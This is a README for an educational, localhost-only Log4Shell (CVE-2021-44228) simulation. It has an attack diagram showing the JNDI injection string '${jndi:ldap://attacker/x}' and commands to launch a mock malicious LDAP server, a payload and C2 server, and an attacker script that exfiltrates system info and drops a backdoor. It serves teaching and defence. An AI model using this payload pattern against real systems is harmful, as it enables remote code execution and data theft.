# Log4Shell (CVE-2021-44228) Attack Simulation

This demo safely simulates the Log4Shell Remote Code Execution vulnerability that was discovered in Apache Log4j 2.x in December 2021. It was rated **CVSS 10.0 (Critical)** and affected millions of Java applications worldwide — including services from Apple, Amazon, Cloudflare, Minecraft, Steam, and many more.

## How the Attack Works

```
                                    Victim Server
┌──────────┐                 ┌────────────────────────┐
│ Attacker │  HTTP Request   │  Application Server    │
│  (CLI)   │ ──────────────► │  (e.g. Minecraft,      │
│          │  User-Agent:    │   Spring Boot, etc.)    │
│          │  ${jndi:ldap:// │                         │
│          │  attacker/x}    │  Uses Log4j 2.14.1      │
└──────────┘                 │  for logging             │
                             └──────────┬─────────────┘
                                        │
                               Log4j parses the
                               JNDI string and
                               makes LDAP request
                                        │
                                        ▼
┌──────────────┐  Redirect   ┌──────────────────────┐
│  Malicious   │ ◄────────── │  Malicious LDAP      │
│  HTTP Server │  to HTTP    │  Server (:1389)       │
│  (:8888)     │  payload    │                       │
└──────┬───────┘             └──────────────────────┘
       │
       │  Victim downloads
       │  Exploit.class and
       │  executes it (RCE!)
       ▼
  💀 SYSTEM COMPROMISED
  - System info exfiltrated
  - Backdoor file dropped
  - Reverse shell beacon sent
```

## Prerequisites

- **Python 3.6+** (no external dependencies required)
- Three terminal windows for the full multi-terminal demo, OR
- One terminal for the all-in-one launcher

## Quick Start (Single Terminal)

If you just want to see the full attack chain run automatically:

```bash
cd demos/log4shell_attack
python3 run_all.py
```

## Full Demo Setup (3 Terminals)

### Terminal 1 — Attacker's Malicious Servers

Start BOTH the LDAP referral server and the HTTP payload server + C2:

**Terminal 1A — LDAP Server:**
```bash
cd demos/log4shell_attack/malicious_ldap_server
python3 ldap_server.py
```

**Terminal 1B — HTTP Payload Server + C2 Listener:**
```bash
cd demos/log4shell_attack/malicious_http_server
python3 http_payload_server.py
```

### Terminal 2 — Victim's Vulnerable Application

Start the vulnerable web application running Log4j 2.14.1:
```bash
cd demos/log4shell_attack/vulnerable_app
python3 vulnerable_app.py
```
*Leave this terminal open and visible — this is the victim.*

### Terminal 3 — Attacker Fires the Exploit

In a third terminal, launch the attack:
```bash
cd demos/log4shell_attack/attacker_cli
python3 attacker.py
```

### Observe the Results

1. **Terminal 3 (Attacker CLI):** Shows the exploit payload being sent
2. **Terminal 2 (Victim App):** Shows Log4j parsing the malicious string, performing the LDAP lookup, downloading the exploit class, and executing it — the full RCE chain
3. **Terminal 1B (HTTP/C2 Server):** Shows the malicious class being served and the stolen system information arriving via beacon
4. **Terminal 1A (LDAP Server):** Shows the incoming JNDI lookup and the redirect being sent

Also check the `vulnerable_app/` folder — a `LOG4SHELL_BACKDOOR.txt` file will have been created by the exploit payload, proving arbitrary file-write capability.

## Cleanup

```bash
# Remove the backdoor marker file
rm demos/log4shell_attack/vulnerable_app/LOG4SHELL_BACKDOOR.txt
```

## File Structure

```
log4shell_attack/
├── README.md                  # This file
├── PRESENTATION_SCRIPT.md     # Step-by-step demo talking points
├── run_all.py                 # All-in-one launcher
├── attacker_cli/
│   └── attacker.py            # Exploit launcher (sends the payload)
├── malicious_ldap_server/
│   └── ldap_server.py         # Rogue LDAP referral server
├── malicious_http_server/
│   └── http_payload_server.py # Exploit.class server + C2 beacon listener
└── vulnerable_app/
    └── vulnerable_app.py      # Vulnerable app with simulated Log4j 2.14.1
```

## ⚠️ Disclaimer

This is an **educational simulation** for academic purposes only. All network activity is confined to `127.0.0.1` (localhost). No actual Log4j library, real LDAP protocol, or genuine malware is involved. This code should never be used against systems you do not own.
